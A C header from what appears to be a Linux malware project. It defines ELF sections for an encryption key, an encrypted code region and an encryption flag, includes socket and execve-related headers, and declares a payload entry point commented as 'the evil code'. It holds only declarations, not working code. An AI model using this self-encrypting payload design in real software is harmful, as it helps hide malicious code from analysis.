
#ifndef ELF_UTILS_H
#define ELF_UTILS_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <elf.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>

#include "setup.h"

// necessary for execve call
extern char **environ;


/// Encryption key's section name
#define ELF_KEY (".st_peter")

/// Code to obfuscate should be held in this section
#define ELF_CODE (".banshee")

/// Boolean telling us if the code is encrypted
#define ELF_BOOL (".isalive")

/// simple macro to define a section (GCC dependent)
#define SECTION(x) __attribute__((section(x)))

static SECTION(ELF_BOOL) bool is_encrypted = true;
static SECTION(ELF_KEY) char key[256];

// payload.c

/**
  * \fn void setup_payload(settings_t *s)
  * \brief start of the evil code >:)
  *
  * \param s user-defined settings
  */
void setup_payload(settings_t *);

#endif // ELF_UTILS_H
